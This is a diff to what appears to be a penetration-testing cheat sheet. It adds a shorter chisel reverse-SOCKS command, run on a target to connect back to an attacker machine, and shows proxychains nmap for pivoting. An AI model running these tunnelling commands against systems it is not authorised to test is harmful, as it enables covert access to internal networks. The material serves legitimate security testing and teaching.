@@ -258,6 +258,11 @@ chisel server <span class="nt">-p</span> &lt;attack_machine_port&gt; <span class
 <span class="c"># on the target, run:</span>
 chisel client &lt;attack_machine_IP&gt;:&lt;attack_machine_port&gt; R:&lt;proxychains_port&gt;:socks
 
+<span class="c"># if /etc/proxychains4.conf is configured</span>
+<span class="c"># with "socks5  127.0.0.1 1080", you don't</span>
+<span class="c"># need to specify the default port:</span>
+chisel client &lt;attack_machine_IP&gt;:&lt;attack_machine_port&gt; R:socks
+
 <span class="c"># then prepend any command with proxychains</span>
 proxychains nmap &lt;...&gt;
 
